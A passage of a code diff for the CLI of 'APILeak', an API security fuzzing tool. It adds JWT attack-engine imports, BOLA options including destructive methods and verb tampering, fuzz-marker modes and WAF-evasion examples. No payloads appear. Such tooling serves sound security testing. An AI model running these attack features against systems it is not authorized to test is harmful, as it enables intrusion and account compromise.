@@ -17,8 +17,26 @@ from typing import Optional
 
 from core import APILeakCore, ConfigurationManager, setup_logging
 from core import __version__ as APILEAK_VERSION
+from core.config import AuthContext, AuthType, load_actor_profiles, load_unauthorized_assertions
 from core.logging import get_logger
-from utils.jwt_utils import decode_jwt, encode_jwt, print_jwt_info
+from utils.jwt_utils import (
+    decode_jwt,
+    encode_jwt,
+    print_jwt_info,
+    colorize_jwt,
+    JWT_HEADER_COLOR,
+    JWT_PAYLOAD_COLOR,
+    JWT_SIGNATURE_COLOR,
+    verify_hmac_secret,
+    verify_token,
+    generate_rsa_keypair,
+    generate_ec_keypair,
+    reconstruct_public_key_from_jwks,
+    read_vector_file,
+    parse_raw_request,
+)
+from utils.jwt_attack_engine import JWTAttackEngine
+from utils.jwt_attack_models import AttackType
 from utils.discovery_session import (
     DiscoveryResult,
     DiscoverySession,
@@ -33,6 +51,13 @@ from utils.discovery_checkpoint import (
     DiscoveryCheckpointError,
 )
 from modules.fuzzing.orchestrator import normalize_extensions
+from modules.fuzzing.markers import (
+    FuzzMode,
+    associate_wordlists,
+    find_markers,
+    parse_fuzz_mode,
+    validate_fuzz_keyword,
+)
 from utils.http_client import parse_resolve
 from utils.discovery_export import DiscoveryExportError, write_discovery_export
 from utils.discovery_output import (
@@ -59,12 +84,24 @@ from utils.response_selector import (
 )
 from utils.spec_import import (
     SpecImportError,
+    SpecSchema,
     import_openapi,
     import_postman,
+    load_schema,
     merge_candidates,
     normalize_candidate_path,
 )
 from utils.spec_import import _parse_document as _parse_spec_document
+
+from cli.owasp_descriptors import (
+    OWASP_MODULE_DESCRIPTORS,
+    OwaspModuleDescriptor,
+    all_keys,
+    get_descriptor,
+    iter_descriptors,
+)
+from cli.shared_options import transversal_options
+from cli.module_options import auth_options, bola_options
 
 
 def parse_response_codes(response_filter: str) -> list:
@@ -167,6 +204,38 @@ def _validate_confirm_hits(ctx, param, value):
     if value is not None and value < 1:
         raise click.BadParameter(f"--confirm-hits must be >= 1 (got {value})")
     return value
+
+
+SUPPORTED_METHODS = ("GET", "POST", "PUT", "PATCH", "DELETE")
+
+
+def _validate_methods(ctx, param, value):
+    """Click callback: parse/normalize --methods and reject invalid values.
+
+    ``--methods`` is a comma-separated list of HTTP methods that drives the
+    ParameterFuzzer's injection-point selection (query-carrying vs body-carrying
+    methods). Supported tokens are ``{GET, POST, PUT, PATCH, DELETE}``,
+    case-insensitive. An empty/whitespace-only value is rejected (Requirement
+    6.4) and a value containing no supported HTTP method is rejected while naming
+    the offending value (Requirement 6.5), both before any request is issued.
+    Unsupported tokens are ignored only when at least one supported token is
+    present. Returns the normalized (upper-cased, de-duplicated, order-preserving)
+    list of supported methods written to ``fuzzing.parameters.methods``
+    (Requirement 6.1).
+    """
+    if value is None or not value.strip():
+        raise click.BadParameter("--methods must not be empty or whitespace-only")
+    tokens = [tok.strip().upper() for tok in value.split(",") if tok.strip()]
+    normalized = []
+    for tok in tokens:
+        if tok in SUPPORTED_METHODS and tok not in normalized:
+            normalized.append(tok)
+    if not normalized:
+        raise click.BadParameter(
+            f"--methods contains no supported HTTP method (got {value!r}); "
+            f"supported methods are {', '.join(SUPPORTED_METHODS)}"
+        )
+    return normalized
 
 
 def _validate_timeout(ctx, param, value):
@@ -334,6 +403,25 @@ def parse_header_options(header):
     return parsed
 
 
+def validate_header_options(header):
+    """Validate repeatable ``--header``/``-H`` values are in ``Name: Value`` form.
+
+    A provided custom-header option that does not contain a ``:`` separating a
+    name from a value is malformed; this rejects it with a descriptive error
+    naming the offending header and exits BEFORE any request is issued
+    (Requirement 7.5). Well-formed values are left for :func:`parse_header_options`
+    to split; this only guards the colon-separator precondition.
+    """
+    for raw in header or ():
+        if ':' not in raw:
+            click.echo(
+                f"Error: Malformed --header value '{raw}': expected 'Name: Value' "
+                "with a ':' separating the header name from its value.",
+                err=True,
+            )
+            sys.exit(1)
+
+
 def parse_basic_auth(basic_auth):
     """Split a ``--basic-auth`` ``user:pass`` value into ``(username, password)``.
 
@@ -346,6 +434,53 @@ def parse_basic_auth(basic_auth):
         return None
     username, _, password = basic_auth.partition(':')
     return (username, password)
+
+
+def parse_auth_context_option(values):
+    """Build one :class:`AuthContext` per ``--auth-context`` option value.
+
+    Format: ``user:token[:privilege]`` (Requirement 20.1).
+
+    - Each value is split on ``:`` with ``maxsplit=2`` so a token that itself
+      contains ``:`` (e.g. a JWT is dot-delimited, but bearer values may embed
+      colons) survives intact in the second segment.
+    - When a third ``:privilege`` segment is present, it sets the AuthContext
+      ``privilege_level`` (Requirement 20.3); otherwise the privilege defaults
+      to ``1``.
+    - A value that omits the ``:`` separator between user and token is rejected
+      with a descriptive :class:`click.BadParameter` BEFORE any request is
+      issued (Requirement 20.5).
+
+    Returns a ``List[AuthContext]`` — one context per supplied value
+    (Requirement 20.2). An empty/unspecified ``values`` yields an empty list so
+    the caller can preserve the existing single-``--jwt`` behavior
+    (Requirements 20.4, 26.2).
+    """
+    contexts = []
+    for value in values or ():
+        if ':' not in value:
+            raise click.BadParameter(
+                f"--auth-context must be in the form user:token[:privilege] "
+                f"(got {value!r}): missing ':' separator between user and token."
+            )
+        parts = value.split(':', 2)
+        name, token = parts[0], parts[1]
+        privilege_level = 1
+        if len(parts) == 3 and parts[2] != '':
+            try:
+                privilege_level = int(parts[2])
+            except ValueError:
+                raise click.BadParameter(
+                    f"--auth-context privilege suffix must be an integer "
+                    f"(got {parts[2]!r} in {value!r})."
+                )
+        contexts.append(AuthContext(
+            name=name,
+            type=AuthType.BEARER,
+            token=token,
+            privilege_level=privilege_level,
+        ))
+    return contexts
 
 
 def validate_basic_auth_options(basic_auth, jwt):
@@ -466,6 +601,41 @@ def _load_spec_seeds(openapi_sources, postman_sources):
     return seeds
 
 
+async def _load_spec_schema(openapi_sources, postman_sources, http_engine=None):
+    """Merge ``--openapi`` / ``--postman`` sources into one :class:`SpecSchema`.
+
+    Every supplied Spec_Source (local path OR Spec_Source_URL) is routed through
+    :func:`spec_import.load_schema`, which fetches URLs through the shared
+    ``http_engine`` and reads local files from disk, dispatching both through the
+    same parsing path (Requirements 49.1, 49.2, 51). The resulting per-source
+    ``operations`` / ``security_schemes`` / ``seeds`` are concatenated into a
+    single merged :class:`SpecSchema`.
+
+    Returns ``None`` when no sources are supplied so the caller preserves the
+    existing no-spec full-scan behavior (Requirement 49.3). An unreadable or
+    unparseable source raises :class:`SpecImportError` naming the offending
+    Spec_Source so the caller can abort before issuing any scan request
+    (Requirement 49.4).
+    """
+    if not openapi_sources and not postman_sources:
+        return None
+
+    operations = []
+    security_schemes = []
+    seeds = []
+    for source in list(openapi_sources) + list(postman_sources):
+        schema = await load_schema(source, http_engine=http_engine)
+        operations.extend(schema.operations)
+        security_schemes.extend(schema.security_schemes)
+        seeds.extend(schema.seeds)
+
+    return SpecSchema(
+        operations=operations,
+        security_schemes=security_schemes,
+        seeds=seeds,
+    )
+
+
 def _resolve_dir_candidates(wordlists, openapi_sources, postman_sources):
     """Resolve discovery candidates from wordlists and Spec_Import sources.
 
@@ -518,6 +688,48 @@ def _resolve_dir_candidates(wordlists, openapi_sources, postman_sources):
     return candidate_set, seed_methods, None
 
 
+# Default parameter wordlist used by ``par`` when no ``--wordlist`` is supplied
+# (Requirement 10.4).
+DEFAULT_PARAMETER_WORDLIST = "wordlists/parameters.txt"
+
+
+def _resolve_par_candidates(wordlists):
+    """Resolve the merged, de-duplicated parameter candidate set for ``par``.
+
+    Mirrors the ``dir`` command's repeatable ``--wordlist`` handling
+    (Requirement 10.1): every provided ``--wordlist`` source is read via
+    :func:`_read_wordlist_entries` (which strips surrounding whitespace and
+    drops blank/comment lines), and the combined entries are de-duplicated
+    while preserving first-seen order. Both query and body candidate sets are
+    fed from this single merged set (Requirement 10.2).
+
+    When no ``--wordlist`` is supplied, the default parameter wordlist
+    ``wordlists/parameters.txt`` is used (Requirement 10.4).
+
+    Raises :class:`ValueError` naming the unreadable file when a wordlist source
+    cannot be read, so the caller can stop before any request (Requirement
+    10.3).
+    """
+    sources = list(wordlists or [])
+    if not sources:
+        sources = [DEFAULT_PARAMETER_WORDLIST]
+
+    seen = set()
+    merged = []
+    for source in sources:
+        try:
+            entries = _read_wordlist_entries(source)
+        except OSError as exc:
+            raise ValueError(
+                f"unreadable wordlist file '{source}': {exc}"
+            ) from exc
+        for entry in entries:
+            if entry not in seen:
+                seen.add(entry)
+                merged.append(entry)
+    return merged
+
+
 def prepare_output_filename(output_param):
     """Prepare output filename, ensuring it goes to reports directory"""
     if not output_param:
@@ -544,13 +756,23 @@ def print_banner():
  .8'     `888.   888          888   888       o 888    .o d8(  888   888 `88b.  o.  )88b 
 o88o     o8888o o888o        o888o o888ooooood8 `Y8bod8P' `Y888""8o o888o o888o 8""888P' 
 
-APILeak v0.1.0 - Enterprise API Fuzzing Tool - by Cl0wnR3v
+APILeak v0.2.0 - Enterprise API Fuzzing Tool - by Cl0wnR3v
 """
     click.echo(banner, color=True)
 
 
-def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, ci_mode=False, fail_on="critical", safe_mode=False, extra_headers=None, basic_auth=None):
-    """Create an enhanced configuration with all advanced features integrated"""
+def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, ci_mode=False, fail_on="critical", safe_mode=False, extra_headers=None, basic_auth=None, bola_config=None, module_configs=None, client_cert=None, ca_bundle=None, resolve=None, parameter_methods=None, confirm_hits=None, parameter_max_requests=None, query_candidates=None, body_candidates=None, fuzz_keyword="FUZZ", fuzz_mode="clusterbomb", marker_wordlists=None):
+    """Create an enhanced configuration with all advanced features integrated
+
+    ``module_configs`` generalizes the per-module pre-load config channel: it is
+    a mapping of ``OWASPConfig`` field name (e.g. ``"bola_testing"``) to a plain
+    dict of config values threaded into that module's ``owasp_testing`` sub-dict.
+    The legacy ``bola_config`` parameter is retained as a backward-compatible
+    alias that maps into ``module_configs['bola_testing']`` (preserving the exact
+    BOLA assembly the ``full`` command relied on). When both are empty/None the
+    ``owasp_testing`` sub-dicts are omitted entirely so every module resolves to
+    its safe dataclass defaults and existing behavior is preserved byte-for-byte.
+    """
     # Support environment variable overrides for CI/CD integration
     target_url = target_url or os.getenv('APILEAK_TARGET', '')
     
@@ -570,7 +792,7 @@ def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", use
     
     # Configure user agent settings with environment variable support
     user_agent_settings = {
-        'User-Agent': os.getenv('APILEAK_USER_AGENT', 'APILeak/0.1.0'),
+        'User-Agent': os.getenv('APILEAK_USER_AGENT', 'APILeak/0.2.0'),
         'Accept': 'application/json'
     }
     random_user_agent = False
@@ -645,6 +867,47 @@ def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", use
         "bola", "auth", "property", "resource", "function_auth", "ssrf"
     ]
 
+    # OWASP testing section. Advanced BOLA hardening options (Requirement 34)
+    # are threaded into the owasp_testing.bola_testing sub-dict consumed by
+    # ConfigurationManager._build_owasp_config -> BOLAConfig(**bola_testing).
+    # When ``bola_config`` is None (no advanced BOLA CLI flags) the sub-dict is
+    # omitted entirely, so BOLAConfig resolves to its safe read-only defaults
+    # and existing behavior is preserved byte-for-byte (Requirements 34.3,
+    # 34.4). All boolean flags default to False (their dataclass defaults), and
+    # ``destructive_methods`` is only set when the operator explicitly supplies
+    # --bola-destructive-methods; otherwise the BOLAConfig default {PATCH, PUT}
+    # applies (Requirement 34.2).
+    owasp_testing = {
+        'enabled_modules': owasp_modules
+    }
+
+    # Normalize the per-module pre-load config channel. The legacy ``bola_config``
+    # alias is transformed into the same ``bola_testing`` sub-dict the ``full``
+    # command produced and merged into ``module_configs`` (an explicit
+    # ``module_configs['bola_testing']`` takes precedence). Each field's dict is
+    # then threaded into ``owasp_testing`` so ConfigurationManager builds the
+    # corresponding config dataclass. When no module config is supplied the
+    # sub-dicts are omitted so every module resolves to its safe defaults
+    # (Requirements 34.2-34.4 preserved).
+    normalized_module_configs = dict(module_configs) if module_configs else {}
+    if bola_config:
+        bola_testing = {
+            'allow_destructive': bola_config.get('allow_destructive', False),
+            'enable_composite': bola_config.get('enable_composite', False),
+            'enable_id_leakage': bola_config.get('enable_id_leakage', False),
+            'verb_tampering': bola_config.get('verb_tampering', False),
+            'parameter_pollution': bola_config.get('parameter_pollution', False),
+            'dry_run': bola_config.get('dry_run', False),
+        }
+        destructive_methods = bola_config.get('destructive_methods')
+        if destructive_methods:
+            bola_testing['destructive_methods'] = destructive_methods
+        normalized_module_configs.setdefault('bola_testing', bola_testing)
+
+    for config_field, field_values in normalized_module_configs.items():
+        if field_values:
+            owasp_testing[config_field] = dict(field_values)
+
     config = {
         'target': {
             'base_url': target_url,
@@ -659,7 +922,10 @@ def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", use
                 'methods': ["GET", "POST", "PUT", "DELETE", "PATCH"],
                 'follow_redirects': True,
                 'extensions': [],
-                'enumerate_methods': False
+                'enumerate_methods': False,
+                'fuzz_keyword': "FUZZ",
+                'fuzz_mode': "clusterbomb",
+                'marker_wordlists': None
             },
             'parameters': {
                 'enabled': scan_type in ["full", "par"],
@@ -680,9 +946,6 @@ def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", use
             'response_filter': [],
             'max_requests': None,
             'concurrency': 50
-        },
-        'owasp_testing': {
-            'enabled_modules': owasp_modules
         },
         'authentication': {
             'contexts': [
@@ -713,6 +976,7 @@ def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", use
         'http_output': {
             'status_code_filter': status_code_filter
         },
+        'owasp_testing': owasp_testing,
         'ci_cd_integration': {
             'enabled': ci_mode,
             'fail_on_severity': fail_on,
@@ -745,6 +1009,53 @@ def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", use
         config['authentication']['contexts'][0]['username'] = username
         config['authentication']['contexts'][0]['password'] = password
     
+    # Thread the transversal transport/TLS options into the config here so both
+    # `dir` and `par` centralize this wiring in config creation rather than
+    # patching the returned dict inline in each command body. The CLI validators
+    # have already parsed/validated these before any request: the client cert
+    # (str or (cert, key) tuple), the CA bundle path, and the parsed --resolve
+    # (host, ip) tuple. A None value leaves the APILeakConfig default untouched
+    # (load_config_from_dict reads these via ``config_data.get(...)``), so this
+    # block is a no-op for callers that do not supply them and cannot regress
+    # `dir`/`scan`/`full` behavior (Requirements 9.1, 9.2, 9.3).
+    if client_cert is not None:
+        config['client_cert'] = client_cert
+    if ca_bundle is not None:
+        config['ca_bundle'] = ca_bundle
+    if resolve is not None:
+        config['resolve'] = resolve
+
+    # Thread the parameter-fuzzing controls into ``fuzzing.parameters.*`` so the
+    # `par` path wires these through config creation (mirroring how the
+    # transversal keys above are centralized) instead of patching config_dict in
+    # the `par` command body. These map onto the extended ParameterFuzzingConfig
+    # consumed by the ParameterFuzzer: ``methods`` drives injection-point
+    # selection (R6.1), ``confirm_hits`` enables Hit_Confirmation (R5.1),
+    # ``max_requests`` is the Request_Budget (R11.1), and the query/body
+    # candidate sets override the file-based wordlists (R10.1, R10.2). A None
+    # value leaves the dataclass default in place, so this block is inert for
+    # `dir`/`scan`/`full` which never supply these arguments.
+    parameters_cfg = config['fuzzing']['parameters']
+    if parameter_methods is not None:
+        parameters_cfg['methods'] = parameter_methods
+    if confirm_hits is not None:
+        parameters_cfg['confirm_hits'] = confirm_hits
+    if parameter_max_requests is not None:
+        parameters_cfg['max_requests'] = parameter_max_requests
+    if query_candidates is not None:
+        parameters_cfg['query_candidates'] = query_candidates
+    if body_candidates is not None:
+        parameters_cfg['body_candidates'] = body_candidates
+
+    # Thread the three marker-mode keys into ``fuzzing.parameters.*`` for the
+    # ``par`` command (Requirements 2.4, 2.5, 5.1, 7.1). These are defaulted
+    # so ``dir``/``scan``/``full``/OWASP callers that never pass them are
+    # completely unaffected.
+    if scan_type == "par":
+        parameters_cfg['fuzz_keyword'] = fuzz_keyword
+        parameters_cfg['fuzz_mode'] = fuzz_mode
+        parameters_cfg['marker_wordlists'] = marker_wordlists
+
     # For parameter fuzzing, disable endpoint discovery and use the target directly
     if scan_type == "par":
         config['fuzzing']['endpoints']['enabled'] = False
@@ -752,9 +1063,21 @@ def create_enhanced_config(target_url, wordlist_path=None, scan_type="full", use
     return config
 
 
-def create_default_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, extra_headers=None, basic_auth=None):
-    """Create a default configuration when no config file is provided (legacy compatibility)"""
-    return create_enhanced_config(target_url, wordlist_path, scan_type, user_agent_config, output_filename, advanced_config, status_code_filter, False, "critical", False, extra_headers, basic_auth)
+def create_default_config(target_url, wordlist_path=None, scan_type="full", user_agent_config=None, output_filename=None, advanced_config=None, status_code_filter=None, extra_headers=None, basic_auth=None, client_cert=None, ca_bundle=None, resolve=None, parameter_methods=None, confirm_hits=None, parameter_max_requests=None, query_candidates=None, body_candidates=None, fuzz_keyword="FUZZ", fuzz_mode="clusterbomb", marker_wordlists=None):
+    """Create a default configuration when no config file is provided (legacy compatibility)
+
+    The trailing keyword arguments (``client_cert``/``ca_bundle``/``resolve`` and
+    the ``parameter_*``/``confirm_hits``/``query_candidates``/``body_candidates``
+    set) are the transversal + parameter-fuzzing keys threaded through config
+    creation so the ``par`` command centralizes its wiring here rather than
+    patching the returned dict inline. They all default to None, so existing
+    positional callers (``dir``/``scan``/``full`` and the tests) are unaffected.
+    The three marker-mode keys (``fuzz_keyword``, ``fuzz_mode``,
+    ``marker_wordlists``) mirror ``EndpointFuzzingConfig``'s shape and are only
+    written under ``config_dict['fuzzing']['parameters']`` for ``scan_type=="par"``,
+    so all other commands are unaffected (Requirements 2.4, 2.5, 5.1, 7.1).
+    """
+    return create_enhanced_config(target_url, wordlist_path, scan_type, user_agent_config, output_filename, advanced_config, status_code_filter, False, "critical", False, extra_headers, basic_auth, None, None, client_cert, ca_bundle, resolve, parameter_methods, confirm_hits, parameter_max_requests, query_candidates, body_candidates, fuzz_keyword, fuzz_mode, marker_wordlists)
     """Create a default configuration when no config file is provided"""
     # Support environment variable overrides for CI/CD integration
     target_url = target_url or os.getenv('APILEAK_TARGET', '')
@@ -775,7 +1098,7 @@ def create_default_config(target_url, wordlist_path=None, scan_type="full", user
     
     # Configure user agent settings with environment variable support
     user_agent_settings = {
-        'User-Agent': os.getenv('APILEAK_USER_AGENT', 'APILeak/0.1.0'),
+        'User-Agent': os.getenv('APILEAK_USER_AGENT', 'APILeak/0.2.0'),
         'Accept': 'application/json'
     }
     random_user_agent = False
@@ -844,7 +1167,10 @@ def create_default_config(target_url, wordlist_path=None, scan_type="full", user
                 'wordlist': default_wordlists['endpoints'],
                 'methods': ["GET", "POST", "PUT", "DELETE", "PATCH"],
                 'follow_redirects': True,
-                'enumerate_methods': False
+                'enumerate_methods': False,
+                'fuzz_keyword': "FUZZ",
+                'fuzz_mode': "clusterbomb",
+                'marker_wordlists': None
             },
             'parameters': {
                 'enabled': scan_type in ["full", "par"],
@@ -911,11 +1237,104 @@ def create_default_config(target_url, wordlist_path=None, scan_type="full", user
     return config
 
 
+# ---------------------------------------------------------------------------
+# Shared CLI option decorator stacks
+# ---------------------------------------------------------------------------
+#
+# These reusable Click decorator stacks group the transversal request-context,
+# resilience, concurrency, TLS-transport, matcher/filter, and machine-output
+# options so they can be applied identically to multiple commands (starting
+# with ``dir``; ``par`` gains parity in a later task) without duplicating the
+# option names, help text, defaults, or validator callbacks.
+#
+# Each stack applies its options bottom-up so that when it is used as a single
+# decorator the resulting option display/registration order matches the order
+# in which the options are written here (top to bottom).
+
+
+def request_context_options(f):
+    """Shared request-context options: ``--header``/``-H``, ``--cookie``, ``--basic-auth``."""
+    f = click.option('--basic-auth', 'basic_auth', metavar='user:pass',
+                     help='HTTP Basic credentials (user:pass) sent as an Authorization header on every discovery request.')(f)
+    f = click.option('--cookie', 'cookie', metavar='COOKIE',
+                     help='Raw Cookie header string applied to every discovery request.')(f)
+    f = click.option('--header', '-H', 'header', multiple=True, metavar='"Name: Value"',
+                     help='Custom header applied to every discovery request, "Name: Value" format. Repeatable.')(f)
+    return f
+
+
+def resilience_options(f):
+    """Shared resilience options: ``--timeout``, ``--retries``."""
+    f = click.option('--retries', 'retries', type=int, default=None, callback=_validate_retries,
+                     help='Number of automatic retries for each failed discovery request '
+                          '(must be >= 0; default: 2).')(f)
+    f = click.option('--timeout', 'timeout', type=float, default=None, callback=_validate_timeout,
+                     help='Per-request timeout in seconds applied to every discovery request '
+                          '(must be > 0; default: 10).')(f)
+    return f
+
+
+def concurrency_options(f):
+    """Shared concurrency options: ``--max-requests``, ``--concurrency``."""
+    f = click.option('--concurrency', 'concurrency', type=int, default=None, callback=_validate_concurrency,
+                     help='Max concurrent in-flight discovery requests (default: 50).')(f)
+    f = click.option('--max-requests', 'max_requests', type=int, default=None, callback=_validate_max_requests,
+                     help='Global request budget for discovery (default: unbounded).')(f)
+    return f
+
+
+def tls_options(f):
+    """Shared TLS-transport options: ``--client-cert``, ``--ca-bundle``, ``--resolve``."""
+    f = click.option('--resolve', 'resolve', metavar='host:ip', default=None, callback=_validate_resolve,
+                     help='Override DNS resolution for the named host to the supplied IP for every '
+                          'discovery request (e.g. api.example.com:127.0.0.1).')(f)
+    f = click.option('--ca-bundle', 'ca_bundle', metavar='PATH', default=None, callback=_validate_ca_bundle,
+                     help='Custom CA bundle used to verify target certificates for every discovery request.')(f)
+    f = click.option('--client-cert', 'client_cert', metavar='PATH[:KEY]', default=None, callback=_validate_client_cert,
+                     help='Client certificate for mutual TLS, presented on every discovery request. '
+                          'A combined cert+key PEM PATH, or a cert:key pair of paths.')(f)
+    return f
+
+
+def matcher_filter_options(f):
+    """Shared response matcher/filter options: ``--match-*`` and ``--filter-*``."""
+    f = click.option('--filter-time', 'filter_time', multiple=True, metavar='EXPR',
+                     help='Exclude results whose response time (seconds) satisfies EXPR. Repeatable.')(f)
+    f = click.option('--filter-regex', 'filter_regex', multiple=True, metavar='REGEX',
+                     help='Exclude results whose response body matches the regular expression REGEX. Repeatable.')(f)
+    f = click.option('--filter-lines', 'filter_lines', multiple=True, metavar='EXPR',
+                     help='Exclude results whose response line count satisfies EXPR. Repeatable.')(f)
+    f = click.option('--filter-words', 'filter_words', multiple=True, metavar='EXPR',
+                     help='Exclude results whose response word count satisfies EXPR. Repeatable.')(f)
+    f = click.option('--filter-size', 'filter_size', multiple=True, metavar='EXPR',
+                     help='Exclude results whose response body size (bytes) satisfies EXPR. Repeatable.')(f)
+    f = click.option('--match-time', 'match_time', multiple=True, metavar='EXPR',
+                     help='Match results whose response time (seconds) satisfies EXPR. Repeatable.')(f)
+    f = click.option('--match-regex', 'match_regex', multiple=True, metavar='REGEX',
+                     help='Match results whose response body matches the regular expression REGEX. Repeatable.')(f)
+    f = click.option('--match-lines', 'match_lines', multiple=True, metavar='EXPR',
+                     help='Match results whose response line count satisfies EXPR. Repeatable.')(f)
+    f = click.option('--match-words', 'match_words', multiple=True, metavar='EXPR',
+                     help='Match results whose response word count satisfies EXPR. Repeatable.')(f)
+    f = click.option('--match-size', 'match_size', multiple=True, metavar='EXPR',
+                     help='Match results whose response body size (bytes) satisfies EXPR (e.g. >100, <50, 10-20, 200). Repeatable.')(f)
+    return f
+
+
+def machine_output_options(f):
+    """Shared machine-readable output options: ``--output-format``, ``--output-file``."""
+    f = click.option('--output-file', 'output_file', type=click.Path(),
+                     help='Destination path for the machine-readable output (extension selects the format)')(f)
+    f = click.option('--output-format', 'output_format', type=click.Choice(['csv', 'jsonl']),
+                     help='Write a machine-readable discovery output in the selected format (csv or jsonl)')(f)
+    return f
+
+
 @click.group()
 @click.option('--no-banner', is_flag=True, help='Suppress banner output')
 @click.pass_context
 def cli(ctx, no_banner):
-    """APILeak v0.1.0 - Enterprise API Fuzzing Tool
+    """APILeak v0.2.0 - Enterprise API Fuzzing Tool
     
     \b
     Performs comprehensive security testing of APIs including:
@@ -930,25 +1349,33 @@ def cli(ctx, no_banner):
     • JWT token manipulation and analysis
     
     \b
-    Basic Commands:
-      python apileaks.py dir --target URL              # Directory fuzzing
-      python apileaks.py par --target URL              # Parameter fuzzing  
-      python apileaks.py full --target URL             # Full security scan
+    Discovery & fuzzing:
+      python apileaks.py dir --target URL              # Directory/endpoint fuzzing
+      python apileaks.py par --target URL              # Parameter fuzzing
     
     \b
-    Advanced Examples:
-      python apileaks.py full --target URL --enable-advanced
-      python apileaks.py full --target URL --detect-framework --fuzz-versions
-      python apileaks.py full --target URL --user-agent-random --enable-waf-evasion
+    OWASP API Security Top 10:
+      python apileaks.py owasp                          # List every OWASP module
+      python apileaks.py owasp bola --target URL        # Run a single module (isolated)
+      python apileaks.py owasp auth --target URL        # Run only the Auth module
+      python apileaks.py scan --target URL              # Orchestrated scan (all modules)
+      python apileaks.py scan --target URL --modules bola,auth   # Selected modules
     
     \b
-    CI/CD Integration:
-      python apileaks.py full --target URL --ci-mode --fail-on critical
+    Advanced examples:
+      python apileaks.py scan --target URL --enable-advanced
+      python apileaks.py scan --target URL --detect-framework --fuzz-versions
+      python apileaks.py scan --target URL --user-agent-random --enable-waf-evasion
     
     \b
-    JWT Utilities:
+    CI/CD integration (severity gate, SARIF, baseline):
+      python apileaks.py scan --target URL --ci-mode --fail-on high --sarif
+    
+    \b
+    JWT utilities (manual toolkit):
       python apileaks.py jwt decode TOKEN
       python apileaks.py jwt encode '{"sub":"user"}' --secret key
+      python apileaks.py jwt --help                     # Full JWT toolkit listing
     """
     ctx.ensure_object(dict)
     ctx.obj['no_banner'] = no_banner
@@ -975,26 +1402,30 @@ def cli(ctx, no_banner):
 @click.option('--rate-limit', type=int, help='Requests per second limit')
 @click.option('--methods', default='GET,POST,PUT,DELETE,PATCH', 
               help='HTTP methods to test (comma-separated)')
+@click.option('--fuzz-keyword', 'fuzz_keyword', default='FUZZ', show_default=True,
+              metavar='KEYWORD',
+              help='Literal token in the target URL marking positions to fuzz. '
+                   'Every occurrence becomes a marker; choose a distinct value to '
+                   'avoid colliding with legitimate URL text. In marker mode the '
+                   'repeatable --wordlist values are the per-marker wordlists in '
+                   'marker order.')
+@click.option('--fuzz-mode', 'fuzz_mode',
+              type=click.Choice(['clusterbomb', 'pitchfork'], case_sensitive=False),
+              default='clusterbomb', show_default=True,
+              help='How multiple markers combine their wordlists: clusterbomb '
+                   '(cartesian product) or pitchfork (index-wise zip).')
 @click.option('--depth', 'depth', type=int, default=None, callback=_validate_depth,
               help='Max recursion depth for discovery (0 = no recursion). '
                    'Overrides APILEAK_MAX_DEPTH and the config default (3).')
 @click.option('--recursive/--no-recursive', 'recursive', default=None,
               help='Enable or disable recursive discovery (default: enabled).')
-@click.option('--max-requests', 'max_requests', type=int, default=None, callback=_validate_max_requests,
-              help='Global request budget for discovery (default: unbounded).')
-@click.option('--concurrency', 'concurrency', type=int, default=None, callback=_validate_concurrency,
-              help='Max concurrent in-flight discovery requests (default: 50).')
+@concurrency_options
 @click.option('--confirm-hits', 'confirm_hits', type=int, default=None, callback=_validate_confirm_hits,
               metavar='N',
               help='Enable Hit_Confirmation: re-request each interesting candidate N times '
                    'and record it only when the responses are consistent (must be >= 1; '
                    'default: off).')
-@click.option('--timeout', 'timeout', type=float, default=None, callback=_validate_timeout,
-              help='Per-request timeout in seconds applied to every discovery request '
-                   '(must be > 0; default: 10).')
-@click.option('--retries', 'retries', type=int, default=None, callback=_validate_retries,
-              help='Number of automatic retries for each failed discovery request '
-                   '(must be >= 0; default: 2).')
+@resilience_options
 @click.option('--extensions', '-x', 'extensions', multiple=True, metavar='EXT',
               help='File extensions to append to each wordlist entry (comma-separated, repeatable). '
                    'e.g. -x json,php or -x .json -x .php. Leading dots are optional.')
@@ -1002,12 +1433,7 @@ def cli(ctx, no_banner):
 @click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
 @click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
 @click.option('--jwt', help='JWT token to use for authentication')
-@click.option('--header', '-H', 'header', multiple=True, metavar='"Name: Value"',
-              help='Custom header applied to every discovery request, "Name: Value" format. Repeatable.')
-@click.option('--cookie', 'cookie', metavar='COOKIE',
-              help='Raw Cookie header string applied to every discovery request.')
-@click.option('--basic-auth', 'basic_auth', metavar='user:pass',
-              help='HTTP Basic credentials (user:pass) sent as an Authorization header on every discovery request.')
+@request_context_options
 @click.option('--enumerate-methods', 'enumerate_methods', is_flag=True, default=False,
               help='Enumerate allowed HTTP methods per discovered endpoint via an OPTIONS '
                    'request (parses the Allow header; default: off).')
@@ -1016,26 +1442,7 @@ def cli(ctx, no_banner):
                    'introspection is enabled (read-only introspection query; default: off).')
 @click.option('--response', help='Filter by response codes (e.g., 200,301,404 or 200-300)')
 @click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
-@click.option('--match-size', 'match_size', multiple=True, metavar='EXPR',
-              help='Match results whose response body size (bytes) satisfies EXPR (e.g. >100, <50, 10-20, 200). Repeatable.')
-@click.option('--match-words', 'match_words', multiple=True, metavar='EXPR',
-              help='Match results whose response word count satisfies EXPR. Repeatable.')
-@click.option('--match-lines', 'match_lines', multiple=True, metavar='EXPR',
-              help='Match results whose response line count satisfies EXPR. Repeatable.')
-@click.option('--match-regex', 'match_regex', multiple=True, metavar='REGEX',
-              help='Match results whose response body matches the regular expression REGEX. Repeatable.')
-@click.option('--match-time', 'match_time', multiple=True, metavar='EXPR',
-              help='Match results whose response time (seconds) satisfies EXPR. Repeatable.')
-@click.option('--filter-size', 'filter_size', multiple=True, metavar='EXPR',
-              help='Exclude results whose response body size (bytes) satisfies EXPR. Repeatable.')
-@click.option('--filter-words', 'filter_words', multiple=True, metavar='EXPR',
